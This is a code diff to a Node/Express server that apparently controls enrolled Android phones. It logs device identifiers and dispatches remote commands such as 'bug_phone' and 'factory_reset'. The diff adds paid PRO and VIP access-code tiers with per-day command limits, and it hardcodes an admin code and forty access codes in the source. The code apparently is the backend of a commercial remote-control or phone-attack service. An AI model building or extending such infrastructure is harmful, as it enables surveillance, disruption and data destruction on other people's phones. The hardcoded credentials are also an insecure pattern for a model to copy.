@@ -11,13 +11,23 @@ const SUPABASE_KEY = process.env.SUPABASE_KEY;
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSession: false } });
 
 const ADMIN_CODE = "201019";
-const VALID_IDS = [
-    // ADD YOUR 40 NEW CODES HERE
-    "93421", "57209", "10485", "68139", "24905", "73018", "41275", "86590", "31942", "50871", 
-    "68731", "92416", "10629", "47309", "81057", "25981", "64539", "39284", "70826", "18450", 
-    "96213", "40785", "83140", "51629", "27468", "65091", "34852", "70936", "12387", "58740", 
-    "82109", "43576", "19634", "75028", "30951", "67284", "51860", "90342", "24879", "76053"
+
+// 20 PRO CODES & 20 VIP CODES
+const PRO_CODES = [
+  "93421", "57209", "10485", "68139", "24905", 
+  "73018", "41275", "86590", "31942", "50871", 
+  "68731", "92416", "10629", "47309", "81057", 
+  "25981", "64539", "39284", "70826", "18450"
 ];
+
+const VIP_CODES = [
+  "96213", "40785", "83140", "51629", "27468", 
+  "65091", "34852", "70936", "12387", "58740", 
+  "82109", "43576", "19634", "75028", "30951", 
+  "67284", "51860", "90342", "24879", "76053"
+];
+
+const ALL_CODES = [...PRO_CODES, ...VIP_CODES];
 
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
 
@@ -27,7 +37,9 @@ function ts() { return Date.now(); }
 app.post('/connect', async (req, res) => {
   try {
     const { userId, device, android, battery, network, androidId } = req.body;
-    if (userId !== ADMIN_CODE && !VALID_IDS.includes(userId)) {
+    
+    // Check if code is valid
+    if (userId !== ADMIN_CODE && !ALL_CODES.includes(userId)) {
         return res.json({ ok: false, err: 'invalid_code' });
     }
     
@@ -83,16 +95,18 @@ app.post('/auth', async (req, res) => {
     return res.json({ ok: true, token: 'admin', userId: ADMIN_CODE, admin: true, tier: 'vip', commands_used: 0 });
   }
 
-  if (!VALID_IDS.includes(password)) {
-    return res.json({ ok: false, err: 'invalid_code' });
-  }
+  // Check Tier
+  let tier = 'pro';
+  if (VIP_CODES.includes(password)) tier = 'vip';
+  else if (PRO_CODES.includes(password)) tier = 'pro';
+  else return res.json({ ok: false, err: 'invalid_code' });
 
   // Fetch device to check how many commands used today
   const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', password).maybeSingle();
   
   res.json({ 
     ok: true, token: 'user', userId: password, admin: false, 
-    tier: 'pro', // Everyone starts as PRO. You manually change to VIP in Supabase.
+    tier: tier, 
     commands_used: d ? d.commands_used : 0 
   });
 });
@@ -126,17 +140,14 @@ app.post('/dispatch', async (req, res) => {
     const { data: d } = await supabase.from('devices').select('commands_used').eq('user_id', userId).maybeSingle();
     let used = d ? d.commands_used : 0;
 
-    // VIP Commands Check (if we want to lock them, but your UI already locks buttons for PRO)
-    if (cmd === 'bug_phone' || cmd === 'factory_reset') {
-        // Note: You can check a 'tier' column here if you add it to Supabase later.
+    // If not VIP, enforce the 10 command limit for PRO
+    if (!VIP_CODES.includes(userId)) {
+        if (used >= 10) { 
+          return res.json({ ok: false, err: 'tier_limit_reached' });
+        }
+        // Increment usage for PRO
+        await supabase.from('devices').update({ commands_used: used + 1 }).eq('user_id', userId);
     }
-
-    if (used >= 10) { // PRO limit is 10
-      return res.json({ ok: false, err: 'tier_limit_reached' });
-    }
-
-    // Increment usage
-    await supabase.from('devices').update({ commands_used: used + 1 }).eq('user_id', userId);
   }
 
   await supabase.from('results').delete().eq('user_id', userId);
